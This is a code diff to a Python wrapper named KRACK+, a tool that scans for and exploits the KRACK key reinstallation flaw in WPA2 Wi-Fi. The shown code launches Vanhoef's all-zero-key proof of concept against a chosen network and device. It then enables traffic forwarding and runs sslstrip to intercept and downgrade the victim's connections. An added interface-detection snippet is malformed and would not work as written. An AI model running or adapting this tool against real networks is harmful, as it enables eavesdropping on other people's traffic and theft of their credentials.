@@ -36,19 +36,27 @@ log.debug("KRACK+ is a tool to scan for and exploit the KRACK vulnerability in W
 log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")
 
 def main():
-    timeOfLastConnectedDevice = 0
-    help_text = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
+    USAGE = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
     path = "~/krack/"
-    parser = optparse.OptionParser(usage=help_text)
+    parser = optparse.OptionParser(usage=USAGE)
 
-
+    # Getting interface name to be used as nic_mon automatically so user wont have to specify them
+    process = subprocess.Popen(["ifconfig", "|", "sed 's/[ \t].*//;/^$/d'", "|", " awk 'FNR==3'", "|", "tr", "-d" "':"], stdout=subprocess.PIPE)
+    out, err = process.communicate()
+    nic_mon = out
+    # Getting interface name to be used as nic_rogue automatically so user wont have to specify them    
+    process = subprocess.Popen(["ifconfig", "|", "sed 's/[ \t].*//;/^$/d'", "|", " awk 'FNR==4'", "|", "tr", "-d" "':"], stdout=subprocess.PIPE)
+    out, err = process.communicate()
+    nic_rogue = out
+    
+    
     # KRACK+ Attack options
     parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
     parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
     parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
-    parser.add_option('--nic-mon', help="This option is used to specify Wireless monitor interface that will listen on the"
+    parser.add_option('--nic-mon', default=nic_mon,  help="This option is used to specify Wireless monitor interface that will listen on the"
                         "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
-    parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
+    parser.add_option('--nic-rogue-ap', default=nic_rogue, help="This option is used to specify Wireless monitor interface that will run a rogue AP"
                         "using a modified hostapd.", dest='rogue')
 
     # KRACK+ Scan options
@@ -124,10 +132,11 @@ def main():
             print("Performing key reinstallation attack")
             #Sets up dependencies before the attack script runs
             subprocess.call(["./prepareClientAttack.sh"])
+
+           
             with open('./attackOutput.txt', 'w') as attackOutput:
                 # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
-                                 options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " + options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
                 # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
                 subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
                 subprocess.call(["sslstrip -w sslstrip.log &"])
@@ -144,11 +153,10 @@ def main():
         subprocess.call(["./restoreClientWifi.sh"])
         log.info("Done, it'll take a few seconds for the client to connect to your Wi-Fi again, if 'auto-reconnect' is enabled on your device")
 
+    ########## NO OPTION OR WRONG USAGE ###########    
     elif options.attack and options.scan:
         log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
         parser.print_help()
-        
-    ########## NO OPTION OR WRONG USAGE ###########    
     else:
         log.warn("No option was given or there were missing arguments, please see usage below and try again!")
         parser.print_help()
